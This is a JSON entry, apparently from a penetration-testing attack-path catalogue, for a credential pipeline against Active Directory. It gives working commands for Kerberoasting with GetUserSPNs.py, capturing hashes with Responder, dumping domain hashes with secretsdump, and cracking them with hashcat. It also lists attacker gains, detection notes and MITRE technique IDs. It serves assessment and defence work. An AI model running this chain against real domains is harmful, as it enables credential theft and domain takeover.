{
  "title": "Kerberoast and Captured Credential Material Pipeline",
  "version": "3.0",
  "description": "Multi-source credential material pipeline combining Kerberoast, responder captures, and directory replication outputs into format-specific offline cracking.",
  "shortDescription": "Kerberoast Credential Pipeline",
  "tags": [
    "password-cracking",
    "active-directory",
    "kerberoast",
    "credential-dumping",
    "credential-access"
  ],
  "metadata": {
    "descriptionHtml": "<p>This graph represents a broad acquisition-to-crack chain where ticket material, protocol captures, and directory replication outputs are unified into one artifact pool. The flow highlights <span style='color:#ef4444;font-weight:bold;'>Kerberoasting</span>, responder-derived captures, and NTDS extraction before routing each format into matching cracking modes.</p>",
    "commandsBlock": "# Step 1: Collect Kerberoast tickets\n$ GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast\n\n# Step 2: Expand capture sources\n$ sudo python3 Responder.py -I eth0 -v\n\n# Step 3: Dump directory material\n$ secretsdump.py -just-dc -outputfile dc_dump <DOMAIN>/<USER>:<PASS>@<DC_IP>\n\n# Step 4: Crack by format\n$ hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt\n$ hashcat -m 1000 dc_dump.ntds /usr/share/wordlists/rockyou.txt",
    "extraInfo": [
      "Impacket GetUserSPNs.py and secretsdump.py",
      "Rubeus/targetedKerberoast variant collection paths",
      "Hashcat mode families: 13100, 19600, 19700, 7500, 5600, 1000"
    ],
    "prerequisites": [
      "AD/KDC reachability and valid assessment scope",
      "Sufficient privileges or position for ticket/capture/replication collection",
      "Prepared cracking dictionaries/rulesets"
    ],
    "attackerGains": [
      "Service-account and domain-account credential material",
      "Recovered plaintext credentials for lateral movement and privilege escalation"
    ],
    "detectionNotes": [
      "Detect anomalous spikes in TGS requests for service accounts",
      "Enable SMB signing and reduce relay/capture exposure",
      "Alert on replication abuse patterns associated with DCSync/secretsdump"
    ],
    "mitreCategories": [
      "T1558.003",
      "T1557.001",
      "T1003.006",
      "T1110.002",
      "T1078"
    ]
  },
